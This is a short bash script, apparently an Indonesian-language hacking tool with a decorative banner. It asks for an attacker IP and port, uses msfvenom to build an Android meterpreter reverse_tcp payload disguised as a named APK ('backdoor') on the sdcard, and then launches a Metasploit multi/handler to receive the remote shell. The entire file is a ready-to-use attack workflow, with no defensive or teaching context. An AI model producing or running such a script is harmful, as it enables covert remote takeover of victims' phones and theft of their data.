#!/bin/bash
# i'm not mastah :)

clear
BB='\033[34;1m'
GG='\033[32;1m'
PP='\033[35;1m'
CC='\033[36;1m'
RR='\033[31;1m'
WW='\033[37;1m'


echo -e $BB'__________                       __    '$RR'  ___ ___'
echo -e $BB'\______   \ ____   _____   _____/  |_  '$RR' /   |   \______'
echo -e $BB' |       _// __ \ /     \ /  _ \   __\ '$RR'/    ~    \____ \'
echo -e $BB' |    |   \  ___/|  Y Y  (  <_> )  |   '$RR'\    Y    /  |_> >'
echo -e $BB' |____|_  /\___  >__|_|  /\____/|__|   '$RR' \___|_  /|   __/'
echo -e $BB'        \/     \/      \/              '$RR'       \/ |__|'
echo -e $CC"──────────────────────────────"
echo -e $BB' ⋄ 𝘼𝙪𝙩𝙝𝙤𝙧 : '$WW'𝙏𝙣. 𝙎𝙖𝙙 𝘽𝙤𝙮 '
echo -e $BB' ⋄ 𝙏𝙚𝙖𝙢 : '$RR'𝘿.𝘾.𝙏 & 𝘾.𝙓.𝙏 '
echo -e $WW'  ⋄ ᴛʜᴀɴᴋs ᴍʏ ғʀɪᴇɴᴅ ⋄ '
echo -e $CC"──────────────────────────────"$WW
echo
read -p "Input Your Port  : " port;
echo
read -p "Masukan Your Ip  : " ip;
echo
echo $BB"Masukan Nama Backdoor Contoh : Test.apk"
read -p "Nama Backdoor : " apk;
echo
sleep 3
sleep 1
clear
echo $GG"port     => "$port
echo $GG"ip       => "$ip
echo $GG"Name Apk => "$apk
echo $BB"Sedang Membuat Backdoor Mohon Sabar Stah.."
sleep 5
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/$apk
echo
echo $GG"Backdor Telah Terbuat Dan Tersimpan Di sdcard!"
echo
echo $GG"Ingin Lanjut y/n?"
read pill
if [ $pill = "y" ] || [ $pill = "Y" ];then
    clear
    echo "Loading..."
else
    echo $GG"Kesalahan"
    exit
fi
echo $GG"Sedang Mempersiap Metasploit .."
sleep 1
msfconsole -q -x "use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set LHOST $ip;
set LPORT $port;
exploit"

